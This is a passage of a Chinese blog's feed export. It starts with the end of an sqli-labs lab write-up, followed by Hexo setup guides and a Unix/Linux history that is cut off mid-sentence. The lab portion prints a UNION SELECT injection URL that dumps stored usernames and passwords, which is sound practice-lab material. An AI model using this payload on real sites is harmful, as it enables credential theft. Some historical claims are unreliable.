alt="less-9.png"></p><ol start="8"><li><strong>爆数据</strong></li></ol><pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/14/D1i9J2FrnAedRSk.png" alt="less-10.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p><p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p><p><a href="https://www.jianshu.com/p/5903e8c002ed" target="_blank" rel="noopener">MYSQL中information_schema简介</a></p><p><a href="https://www.cnblogs.com/xuthus/p/9450805.html" target="_blank" rel="noopener">SQL注入 (1) SQL注入类型介绍</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-next访客统计</title>
      <link href="/2019/08/31/hexo-next%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/"/>
      <url>/2019/08/31/hexo-next%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="设置-leancloud"><a href="#设置-leancloud" class="headerlink" title="设置 leancloud"></a>设置 leancloud</h1><ol><li><p>注册 <a href="https://leancloud.cn/" target="_blank" rel="noopener">leancloud</a> ，并验证邮箱。</p></li><li><p>打开控制台，点击 “创建应用”，这里的”应用名”自定义。</p></li></ol><p><img src="https://i.loli.net/2019/08/31/BGXFcAwREtODrJZ.png" alt="LC-1.png"></p><p><img src="https://i.loli.net/2019/08/31/sWf3eqBDMPuRv8g.png" alt="LC-2.png"></p><ol start="3"><li>点击”存储”，新建 class。这里的class名称必须是”Counter”。为了让统计准确，这里 Counter 的权限设为 “无限制”</li></ol><p><img src="https://i.loli.net/2019/08/31/idPSVguAr5yFQGw.png" alt="LC-3.png"></p><p><img src="https://i.loli.net/2019/08/31/vWOC4nNLlwVGYIK.png" alt="LC-4.png"></p><ol start="4"><li>选择 “设置” –&gt; “应用key”。记录 “App ID” 和 “App Key” 的内容</li></ol><p><img src="https://i.loli.net/2019/08/31/F7iUYHlaMZIbCTu.png" alt="LC-5.png"> </p><h1 id="设置-config-yml"><a href="#设置-config-yml" class="headerlink" title="设置 _config.yml"></a>设置 _config.yml</h1><ol><li>编辑 next 主题配置文件 _config.yml，搜索关键字 “leancloud_visitors” 并修改成如下内容：</li></ol><pre class=" language-yml"><code class="language-yml">leancloud_visitors:  enable: true  app_id: <<your app_id>>  app_key: <<your app_key>>  # Dependencies: https://github.com/theme-next/hexo-leancloud-counter-security  # If you don't care about security in leancloud counter and just want to use it directly  # (without hexo-leancloud-counter-security plugin), set `security` to `false`.  security: true  betterPerformance: false</code></pre><ol start="2"><li>开启 web 安全</li></ol><p>此时的 AppID 以及 AppKey 是暴露在外的，为了保证自己的博客安全，建议开启 leancloud 的”Web安全选项”。在 “设置” –&gt; “安全中心” –&gt; “Web 安全域名” 中添加自己的域名。</p><p><img src="https://i.loli.net/2019/08/31/5lpD82eiv6OHInb.png" alt="LC-6.png"></p><ol start="3"><li>最后 “Leancloud访客统计插件” 存在漏洞。</li></ol><p>当你上传配置并登录网页后，文章下面标题会出现如下报错：</p><pre class=" language-yml"><code class="language-yml">Error： 阅读次数：Counter not initialized! See more at console err msg.</code></pre><ul><li>解决方法</li></ul><ol><li>将 “security” 选项设为 “false”。修改后的内容如下：</li></ol><pre class=" language-yml"><code class="language-yml">leancloud_visitors:  enable: true  app_id: <<your app_id>>  app_key: <<your app_key>>  # Dependencies: https://github.com/theme-next/hexo-leancloud-counter-security  # If you don't care about security in leancloud counter and just want to use it directly  # (without hexo-leancloud-counter-security plugin), set `security` to `false`.  security: false  betterPerformance: false</code></pre><ol start="2"><li><p>根据大神的博客，手动修复漏洞。</p><p> <a href="https://leaferx.online/2018/02/11/lc-security/#5acc7b329f54542bb2384a7e" target="_blank" rel="noopener">Leancloud访客统计插件重大安全漏洞修复指南</a></p></li></ol><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://yfzhou.coding.me/2018/08/08/Hexo-Next%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E6%B7%BB%E5%8A%A0%E7%BB%9F%E8%AE%A1%E8%AE%BF%E5%AE%A2%E9%87%8F%E4%BB%A5%E5%8F%8A%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%EF%BC%89/" target="_blank" rel="noopener">Hexo-Next搭建个人博客（添加统计访客量以及文章阅读量）</a></p><p><a href="https://leaferx.online/2018/02/11/lc-security/#5acc7b329f54542bb2384a7e" target="_blank" rel="noopener">Leancloud访客统计插件重大安全漏洞修复指南</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> theme-next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo中添加lived看板娘</title>
      <link href="/2019/08/31/hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0lived%E7%9C%8B%E6%9D%BF%E5%A8%98/"/>
      <url>/2019/08/31/hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0lived%E7%9C%8B%E6%9D%BF%E5%A8%98/</url>
      
        <content type="html"><![CDATA[<h1 id="小白水平"><a href="#小白水平" class="headerlink" title="小白水平"></a>小白水平</h1><ol><li>安装 live2d 模块</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> --save hexo-helper-live2d</code></pre><ol start="2"><li><p>在 hexo 根目录下创建 “ live2d_models “ 目录</p></li><li><p>克隆 Live2dDemo 项目</p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/summerscar/live2dDemo.git</code></pre><ol start="4"><li><p>将 “ /live2dDemo/assets/ “ 目录下的所有内容复制到 “ live2d_models “ 中</p></li><li><p>在根目录下的 “ _config.yml “ 文件最后添加如下内容：</p></li></ol><pre class=" language-yml"><code class="language-yml">live2d:  enable: true  scriptFrom: local  pluginRootPath: live2dw/  pluginJsPath: lib/  pluginModelPath: assets/  tagMode: false  debug: false  model:    use: poi    # live2d_models 下的目录名  display:    position: right # 模型放置位置    width: 150  # 模型的宽    height: 300 # 模型的高  mobile:    show: true  react:    opacity: 0.7</code></pre><p>注：在 <a href="https://github.com/summerscar/live2dDemo">https://github.com/summerscar/live2dDemo</a> 中可以查看自己喜欢的看板娘，并在 model.use 中应用相应目录名。</p><h3 id="大神水平"><a href="#大神水平" class="headerlink" title="大神水平"></a>大神水平</h3><ol><li>在根目录 “ .deploy_git/index.html “ 的&lt;head&gt;&lt;/head&gt;标签中添加如下内容：</li></ol><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--live2d--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--live2d--></span></code></pre><ol start="2"><li>克隆 live2d-widget</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/stevenjoezhang/live2d-widget</code></pre><ol start="3"><li><p>将 “live2d-widget” 目录放到 “themes/主题/source” 下</p></li><li><p>修改 “live2d-widget” 目录下的 “autoload.js”</p></li></ol><p>将</p><pre class=" language-yml"><code class="language-yml">const live2d_path = "https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/";</code></pre><p>改为</p><pre class=" language-yml"><code class="language-yml">const live2d_path = "/live2d-widget/";</code></pre><ol start="5"><li>在 “/themes/主题/layout/_layout.swing” 或 “/themes/主题/layout/layout.ejs” 添加如下内容：</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/live2d-widget/autoload.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><ol start="6"><li>在 “ /themes/主题/_config.yml “ 中，添加如下内容：</li></ol><pre class=" language-yml"><code class="language-yml">live2d:  enable: true</code></pre><p>注：这里配置完成后，要把 根目录下的 “ _config.yml “ live2d 关掉</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.csdn.net/dataiyangu/article/details/83021854" target="_blank" rel="noopener">hexo中next主题添加里lived看板娘（会说话，会换装)</a></p><p><a href="https://www.jianshu.com/p/89440678ee3c" target="_blank" rel="noopener">Hexo博客NexT主题美化之新增看板娘(能说话、能换装)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> theme-next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux简介</title>
      <link href="/2019/08/29/linux%E7%AE%80%E4%BB%8B/"/>
      <url>/2019/08/29/linux%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="linux简介"><a href="#linux简介" class="headerlink" title="linux简介"></a>linux简介</h1><p>Linux 是一套免费使用和自由传播的类 Unix 操作系统。因为 linux 是借鉴 Unix 来开发的，与 unix 有许多相似之处，并且在一定程度上遵守 POSIX 规范。</p><h1 id="Unix-起源"><a href="#Unix-起源" class="headerlink" title="Unix 起源"></a>Unix 起源</h1><ul><li>MULTICS 项目</li></ul><p>回顾 Unix 历史，我们就要说一下一个叫 MULTICS 的项目。上世纪六十年代时，大部份计算机都是采用批处理的方式（也就是说，当作业积累一定数量的时候，计算机才会进行处理）。那时，我们熟知的美国电话及电报公司（AT&amp;T）、通用电器公司（G.E.）及麻省理工学院（MIT）计划合作开发一个多用途、分时及多用户的操作系统，也就是这个 MULTICS，其被设计运行在 GE-645 大型主机上。不过，这个项目由于太过复杂，整个目标过于庞大，糅合了太多的特性，进展太慢，几年下来都没有任何成果，而且性能都很低。于是到了 1969 年 2 月，贝尔实验室决定退出这个项目。</p><ul><li>Space Travel</li></ul><p>熟悉这段历史的人都知道，贝尔实验室中的有个叫 Ken Thompson 的人，他为 MULTICS 这个操作系统写了个游戏叫 “Space Travel” 的游戏，在 MULTICS 上经过实际运行后，他发现游戏速度很慢而且耗费昂贵 —— 每次运行会花费 75 美元。退出这个项目以后。他为了让这个游戏能玩，所以他找来 Dennis Ritchie 为这个游戏开发一个极其简单的操作系统。这就是后来的 Unix。（值得一提的是，当时他们本想在 DEC-10 上写，后来没有申请到，只好在实验室的土·啬角边找了一台被人遗弃的 Digital PDP-7 的迷你计算机进行他们的计划，这台计算机上连个操作系统都没有，于是他们用汇编语言仅一个月的时间就开发了一个操作系统的原型）他们的同事 Brian Kernighan 非常不喜欢这个系统，嘲笑 Ken Thompson 说：“你写的系统好真差劲，干脆叫 Unics 算了。” Unics 的名字就是相对于 MULTICS 的一种戏称，后业改成了 Unix。于是，Unix 就在这样被游戏和玩笑创造了，当时是1969年8 月。也就是这一年，Linux 之父 Linus Torvalds 在芬兰出生了。</p><ul><li>Unix 第一版出现</li></ul><p>1971年，Ken Thompson 写了充分长篇的申请报告，申请到了一台 PDP-11/24 的机器。于是 Unix 第一版出来了。在一台 PDP-11/24 的机器上完成。这台电脑只有 24KB 的物理内存和 500K 磁盘空间。Unix 占用了 12KB 的内存，剩下的一半内存可以支持两用户进行 Space Travel 的游戏。而著名的 fork() 系统调用也就是在这时出现的。</p><ul><li>C 语言出现</li></ul><p>到了 1973 年的时候，Ken Thompson 与 Dennis Ritchie 感到用汇编语言做移植太过于头痛，他们想用高级语言来完成第三版，对于当时完全以汇编语言来开发程序的年代，他们的想法算是相当的疯狂。一开始他们想尝试用 Fortran，可是失败了。后来他们用一个叫 BCPL 的语言开发，他们整合了BCPL 形成 B 语言，后来 Dennis Ritchie 觉得 B 语言还是不能满足要求，就是就改良了 B 语言，这就是今天的大名鼎鼎的 C 语言。于是，Ken Thompson 与 Dennis Ritchie 成功地用 C 语言重写了 Unix 的第三版内核。至此，Unix 这个操作系统修改、移植相当便利，为 Unix 日后的普及打下了坚实的基础。而 Unix 和 C 完美地结合成为一个统一体，C 与 Unix 很快成为世界的主导。</p><ul><li>Unix 发布</li></ul><p>Unix 的第一篇文章 “The UNIX Time Sharing System” 由 Ken Thompson 和 Dennis Ritchie 于1974年7月的 the Communications of the ACM 发表。这是 UNIX 与外界的首次接触。结果引起了学术界的广泛兴趣并对其源码索取，所以，Unix 第五版就以“仅用于教育目的”的协议，提供给各大学作为教学之用，成为当时操作系统课程中的范例教材。各大学公司开始通过 Unix 源码对 Unix 进行了各种各样的改进和扩展。于是，Unix 开始广泛流行。</p><h2 id="Unix-分裂"><a href="#Unix-分裂" class="headerlink" title="Unix 分裂"></a>Unix 分裂</h2><ul><li>BSD 出现</li></ul><p>1978年，对 Unix 而言是革命性的一年；因为学术界的老大柏克利大学，推出了一份以第六版为基础，加上一些改进和新功能而成的 Unix。这就是著名的 “1 BSD（1st Berkeley Software Distribution）”，开创了 Unix 的另一个分支：BSD 系列。 同时期，AT&amp;T 成立 USG，将 Unix 变成商业化的产品。从此，BSD 的 Unix 便和 AT&amp;T 的 Unix 分庭抗礼，Unix 就分为 System IV 和 4.x BSD 这两大主流，各自蓬勃发展。</p><ul><li>“最后一个真正的Unix”</li></ul><p>1979 年发布的 Unix 第七版被称为是“最后一个真正的 Unix”，这个版本的 Unix 内核只有 40K bytes。后来这个版本被移植到 VAX 机上。20世纪80年代相继发布的 8、9、10 版本只授权给了少数大学。</p><ul><li>TCP/IP</li></ul><p>1982 年，AT&amp;T 基于版本 7 开发了 UNIX System Ⅲ 的第一个版本，这是一个商业版本仅供出售。为了解决混乱的 UNIX 版本情况，AT&amp;T 综合了其他大学和公司开发的各种 UNIX，开发了 UNIX System V Release 1。这个新的 UNIX 商业发布版本不再包含源代码，所以加州大学 Berkeley 分校继续开发 BSD UNIX，作为 UNIX System III 和 V 的替代选择。BSD 对 UNIX 最重要的贡献之一是 TCP/IP。BSD 有 8 个主要的发行版中包含了 TCP/IP：4.1c、4.2、4.3、4.3-Tahoe、4.3-Reno、Net2、4.4以及 4.4-lite。这些发布版中的 TCP/IP 代码几乎是现在所有系统中 TCP/IP 实现的前辈，包括 AT&amp;T System V UNIX 和 Microsoft Windows中 的 TCP/IP 都参照了 BSD 的源码。</p><ul><li>sun</li></ul><p>同时，其他一些公司也开始为其自己的小型机或工作站提供商业版本的 UNIX 系统，有些选择 System V 作为基础版本，有些则选择了 BSD。BSD 的一名主要开发者，Bill Joy，在 BSD 基础上开发了 SunOS，并最终创办了 Sun Microsystems。</p><ul><li>386BSD</li></ul><p>1991年，一群 BSD开发者（Donn Seeley、Mike Karels、Bill Jolitz 和 Trent Hein）离开了加州大学，创办了 Berkeley Software Design， Inc （BSDI）。BSDI 是第一家在便宜常见的 Intel 平台上提供全功能商业 BSD UNIX 的厂商。后来 Bill Jolitz 离开了 BSDI，开始了 386BSD 的工作。386BSD 被认为是 FreeBSD、OpenBSD 和 NetBSD、DragonFlyBSD 的先辈。</p><ul><li>POSIX 标准</li></ul><p>这是一个 AT&amp;T 妄图私有化的 Unix 的时代。为了私有化 Unix，1986 年 IEEE 指定了一个委员会制定了一个一个开放作业系统的标准，称为 POSIX （Portable Operating Systems Interface）。最后加上个 X，不知道是为了好听，还是因为这本质上是 UNIX 的标准。当然，AT&amp;T 的 Unix 取得了这个标准制订战争的胜利，还取得了 Unix 这个注册商标。此时 BSD 的拥护者自喻为冷酷无情的公司帝国的反抗军。就销售量来说，AT&amp;T UNIX 始终赶不上 BSD/Sun。到 1990 年，AT&amp;T 与 BSD 版本已难明显区分，因为彼此都有采用对方的新发明。</p><p>这段时期，从实验室出来的被全世界所分享的 Unix，正处于被私有化的关键时期。</p><ul><li>Unix 的法律纠纷</li></ul><p>BSDI 很快就与 AT&amp;T 的 UNIX Systems Laboratories（USL）附属公司产生了法律纠纷，USL 是 AT&amp;T 注册的公司。AT&amp;T 为了拥有 System V 版权，以及 Unix 商标，为了垄断 Unix，1992年，USL 正式对 BSDI 提起诉讼，说 BSD 剽窃他的源码。而最终了结了好评如潮的 BSD 系统。</p><p>由于最后判决悬而未决，这桩法律诉讼将 BSD 后裔的开发，特别是自由软件，延迟了两年，这导致没有法律问题的 Linux 内核获得了极大的支持。Linux 跟 386BSD 的开发几乎同时起步，Linus 说，当时如果有自由的基于 386 的 Unix-like 操作系统，他就可能不会创造 Linux。尽管无法预料这给以后的软件业究竟造成了什么样的影响（如果没有这个法律纠纷，很有可能没有今天的革命性的 Linux），但有一点可以肯定，Linux 更加丰富了这块土壤。</p><p>这场官司一直打到  AT&amp;T 将自己的 Unix 系统实验室卖掉，新接手的 Novell 公司采取了一种比较开明的做法，允许 BSDI 自由发布自己的 BSD，但是前提是必须将来自于 AT&amp;T 的代码完全删除，于是诞生了 4。4 BSD Lite 版，由于这个版本不存在法律问题，4。4BSD Lite 成为了现代 BSD 系统的基础版本。</p><p>这桩诉讼最终在1994年1月了结，更多地满足了 BSDI 的利益。伯克利套件的 18，000 个文件中，只有 3 个文件要求删除，另有 70 个文件要求修改，并显示 USL 的版权说明。这项调解另外要求，USL 不得对 4。4BSD 提起诉讼，不管是用户还是 BSDI 代码的分发者。于是，BSD Unix 走上了复兴的道路。BSD 的开发也走向了几个不同的方向，并最终导致了 FreeBSD、OpenBSD 和 NetBSD 的出现。</p><p>从 AT&amp;T 意识到了 Unix 的商业价值，不再将 Unix 源码授权给学术机构以来，到以后的几十年，Unix 仍在不断变化，其版权所有者不断变更，授权者的数量也在增加。Unix 的版权曾经为 AT&amp;T 所有，之后 Novell 拥有了 Unix，再之后 Novell 又将版权出售给了 SCO（这一事实双方尚存在争议，这里是最新进展）。有很多大公司在取得了 Unix 的授权之后，开发了自己的 Unix 产品。（几年前，据传闻微软为了限制 Linux，微软让 SCO 到法院告Linux 剽窃其源码）</p><p>由于 Unix 是由 C 语言写的，所以修改和移植都很容易，因此，很多商业公司及学术机构均加入这个操作系统的研发，各个不同版本的 Unix 也开始蓬勃发展。这才产生了今天这么多的各式各样的 Unix 衍生产品。如 AIX、Solaris、HP-UX、IRIX、OSF、Ultrix 等等。（这些商业化的 Unix 基本上都是源于 AT&amp;T 授权的 Unix System V）</p><h2 id="Unix-开源组织"><a href="#Unix-开源组织" class="headerlink" title="Unix 开源组织"></a>Unix 开源组织</h2><p>AT&amp;T 的这种商业态度，让当时许许多的 Unix 的爱好者和软件开发者们感到相当的痛心和忧虑，他们认为商业化的种种限制并不利于产生的发展，相反还能导制产品出现诸多的问题。随着商业化 Unix 的版本的种种限制和诸多问题，引起了大众的不满和反对。于是，大家开始有组织地结成“反叛联盟”以此对抗欺行罢市的 AT&amp;T 等商业化行为。<br>另一方面，关于“大教堂”（集权、封闭、受控、保密）和“集市”（分权、公开、精细的同僚复审）两种开发模式的对比成为了新思潮的中心思想。这个新思潮对 IT 业产生了非常深远影响。为整个计算机世界带来了革命性的价值观。</p><ul><li>Open Source</li></ul><p>此时，一个名叫 Richard Stallman 的领袖出现了，他认为 Unix 是一个相当好的操作系统，如果大家都能够将自己所学贡献出来，那么这个系统将会更加的优异！他倡导的 Open Source 的概念，就是针对 Unix 这一事实反对实验室里的产品商业化私有化。尽管 Stallman 既不是、也从来没有成为一个 Unix 程序员，但在后 1980 的大环境下，实现一个仿 Unix 操作系统成了他追求的明确战略目标。Richard Stallman 早期的捐助者大都是新踏入 Unix 土地的老牌 ARPANET 黑客，他们对代码共享的使命感甚至比那些有更多 Unix 背景的人强烈。</p><ul><li>GNU</li></ul><p>为了这个理想，Richard Stallman 于 1984 年创业了 GNU，计划开发一套与 Unix 相互兼容的的软件。1985 年 Richard Stallman 又创立了自由软件基金会（Free Software Foundation）来为 GNU 计划提供技术、法律以及财政支持。尽管 GNU 计划大部分时候是由个人自愿无偿贡献，但 FSF 有时还是会聘请程序员帮助编写。当 GNU 计划开始逐渐获得成功时，一些商业公司开始介入开发和技术支持。当中最著名的就是之后被 Red Hat 兼并的 Cygnus Solutions。</p><p>GNU 组织的建立，延续了当年 Unix 刚出现时的情形，并为这种情形建立了可靠的法律和财务保障。GNU 工程十几年以来， 已经成为一个对软件开发主要的影响力量， 创造了无数的重要的工具。例如：强健的编译器，有力的文本编辑器，甚至一个全功能的操作系统。从那时开始，许多程序员聚集起来开始开发一个自由的、高质量、易理解的软件，让这使得 Unix 社区生机勃勃，一派繁荣景象。</p><p>自90年代发起这个计划以来，GNU 开始大量的产生或收集各种系统所必备的组件，像是——函数库、编译器、调式工具、文本编辑器、网站服务器，以及一个 Unix 的使用者接口（Unix shell）等等，等等。但由于种种原因，GNU 一直没有开发操作系统的 kernel。正当 Richard Stallman在为操作系统内核伤脑筋的时候，Linux 出现了。</p><h1 id="Linux-横空出世"><a href="#Linux-横空出世" class="headerlink" title="Linux 横空出世"></a>Linux 横空出世</h1><p>1990年，Linus Torvalds 还是芬兰赫尔辛基大学的一名学生，最初是用汇编语言写了一个在 80386 保护模式下处理多任务切换的程序，后来从 Minix 得到灵感，进一步产生了自认为狂妄的想法——写一个比 Minix 更好的 Minix，于是开始写了一些硬件的设备驱动程序，一个小的文件系统。这样0.0.1版本的 Linux 就出来了，但是它只具有操作系统内核的勉强的雏形，甚至不能运行，你必须在有 Minix 的机器上编译以后才能玩。这时候 Linus 已经完全着迷而不想停止，决定踢开 Minix，于是在1991年10 月5号发布 Linux 0.0.2 版本，在这个版本中已经可以运行 bash 和 gcc。</p><ul><li>Linux 1.0</li></ul><p>从一开始，Linus 就决定自由扩散 Linux，包括原代码，随即 Linux 引起黑客们的注意，通过计算机网络加入了 Linux 的内核开发。Linux 倾向于成为一个黑客的系统——直到今天，在 Linux 社区里内核的开发被认为是真正的编程。由于一批高水平黑客的加入，使 Linux 发展迅猛，几乎一两个礼拜就有新版或修正版的出现，到1993年底94年初，Linux 1.0 终于诞生了！</p><p>Linux 1.0 已经是一个功能完备的操作系统，而且内核写得紧凑高效，可以充分发挥硬件的性能，在 4M 内存的 80386 机器上也表现得非常好，至今人们还在津津乐道。时至今日，kernel 的版本已经出到 2.6。Linux 的发展不像传统的软件工程，它完全是透过网络，集合世界各地的高手而成的一套操作系统，在这里我们也可以见识到网络快速传播的威力。Linux 初次让整个世界感觉到了开源力量和网络力量的如此强大。（Linux 的标志和吉祥物是一只名字叫做 Tux 的企鹅，标志的由来是因为Linus在澳洲时曾被一只动物园里的企鹅咬了一口，便选择了企鹅作为Linux的标志。）</p><ul><li>Red Hat</li></ul><p>Linux 的历史是和 GNU 紧密联系在一起的。从1983年开始的 GNU 计划致力于开发一个自由并且完整的类 Unix 操作系统，包括软件开发工具和各种应用程序。到 1991年 Linux 内核发布的时候，GNU 已经几乎完成了除了系统内核之外的各种必备软件的开发。在 Linus Torvalds 和其它开发人员的努力下，GNU 组件可以运行于 Linux 内核之上。整个内核是基于 GNU 通用公共许可，也就是 GPL（GNU General Public License，GNU通用公共许可证）的，但是 Linux 内核并不是 GNU 计划的一部分。1994年3月，Linux1.0 版正式发布，Marc Ewing 成立了 Red Hat 软件公司，成为最著名的 Linux 分销商之一。</p><p>严格来讲，Linux 这个词本身只表示 Linux 内核，但在实际上人们已经习惯了用 Linux 来形容整个基于 Linux 内核，并且使用 GNU 工程各种工具和应用程序的操作系统（也被称为 GNU/Linux）。基于这些组件的 Linux 软件被称为 Linux 发行版。一般来讲，一个 Linux 发行套件包含大量的软件，比如软件开发工具，数据库，Web 服务器（例如 Apache），X Window，桌面环境（比如 GNOME 和 KDE），办公套件（比如 OpenOffice.org），等等。</p><p>1991 至 1995 年间，Linux 从概念型的 0.1 版本内核原型，发展成为能够在性能和特性上均堪媲美专有 Unix 的操作系统，并且在连续正常工作时间等重要统计数据上打败了这些 Unix 中的绝大部分。1995 年，Linux 找到了自己的杀手级应用——开源的 web 服务器 Apache。就像 Linux，Apache 出众地稳定和高效。很快，运行 Apache 的 Linux 机器成了全球 ISP 平台的首选。约 60% 的网站选用 Apache，轻松击败了另两个主要的专有型竞争对手。今天的 LAMP（Linux ， Apache， MySQL， PHP）已经成为了架构 Web 服务器的主要首选。<br>现如今的 Linux 不但可以装在几乎所有的主流服务器上，当然也包括桌面的 X86 系统中。其还常常被用于嵌入式系统，机顶盒、手机、交换机、游戏机、PDA、网络交换机、路由器、等等，都是因为 Linux 那精彩的内核。</p><p>Linux 的出现，不仅仅给世界带来了一个免费的操作系统，也不仅仅是对 Unix 自由、共享的文化的延续，它的出现带给了计算机世界自 Unix、GNU 以来更为成熟的思想和文化。</p><h2 id="Linux-——-今天的领袖"><a href="#Linux-——-今天的领袖" class="headerlink" title="Linux —— 今天的领袖"></a>Linux —— 今天的领袖</h2><p>Linux 和 GNU 关系是比较微妙的。那时，自由软件基金会编写的用户软件工具包铺平了一条摆脱高成本专有软件开发工具的前进道路。意识服从经济，而不是领导：一些新手加入了 RMS 的革命运动，高举 GPL 大旗，另一些人则更认同整体意义上的 Unix 传统，加入了反对 GPL 的阵营，但其他大部分人置身事外，一心编码。</p><p>今天，我们也说不清楚是 GNU Linux 还是 Linux GNU。Linux 既不排斥开源，也不排斥商业化，Linus 认为好的软件是需要免费和商业化共同推进的。正是这种革命性的想法，造就了今天的 Linux 火红的局面。Linux 就像一股清泉流入了所有人的心中，引发了很多的启迪和思考。</p><h2 id="Unix-的历史教训"><a href="#Unix-的历史教训" class="headerlink" title="Unix 的历史教训"></a>Unix 的历史教训</h2><p>在 Unix 历史中，最大的规律就是：<br>距开源越近就越繁荣。任何将 Unix 专有化的企图，只能陷入停滞和衰败。<br>回顾过去，我们早该认识到这一点。1984年至今，我们浪费了十年时间才学到这个教训。如果我们日后不思悔改，可能还得大吃苦头。</p><p>虽然我们在软件设计这个重要但狭窄的领域比其他人聪明，但这不能使我们摆脱对技术与经济相互作用影响的茫然，而这些就发生在我们的眼皮底下。即使 Unix 社区中最具洞察力、最具远见卓识的思想家，他们的眼光终究有限。对今后的教训就是：过度依赖任何一种技术或者商业模式都是错误的——相反，保持软件及其设计传统的的灵活性才是长存之道。</p><p>另一个教训是：别和低价而灵活的方案较劲。或者，换句话说，低档的硬件只要数量足够，就能爬上性能曲线而最终获胜。经济学家 Clayton Christensen 称之为“破坏性技术”，他在《创新者窘境》一书中以磁盘驱动器、蒸汽挖土机和摩托车为例阐明了这种现象的发生。当小型机取代大型机、工作站和服务器取代小型机以及日用 Intel 机器又取代工作站和服务器时，我们也看到了这种现象。开源运动获得成功正是由于软件的大众化。Unix 要繁荣，就必须继续采用吸纳低价而灵活的方案的诀窍，而不是去反对它们。</p><p>最后，旧学派的 Unix 社区因采用了传统的公司组织、财务和市场等命令机制而最终未能实现“职业化”。只有痴迷的“黑客”和具有创造力的怪人结成的反叛联盟才能把我们从愚蠢中拯救出来——他们接着教导我们，真正的专业和奉献精神，正是我们在屈服于世俗观念的“合理商业做法”之前的所作所为。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在中国，我们被微软所创造的文化所笼罩里。就在 Unix 出现革命性的转变，在 Unix 影响计算机世界文化的那几年里，科班出生专业开发人员学习的是 MS-DOS 和微软的文化，我们犹如一个井底之蛙一样，对外面的番·习天覆地的变化无动于衷。微软创造的文化在我们这里尤其地根深蒂固，我们几乎忘记了另外一边的 Unix 。</p><p>在那充满激情的 Unix 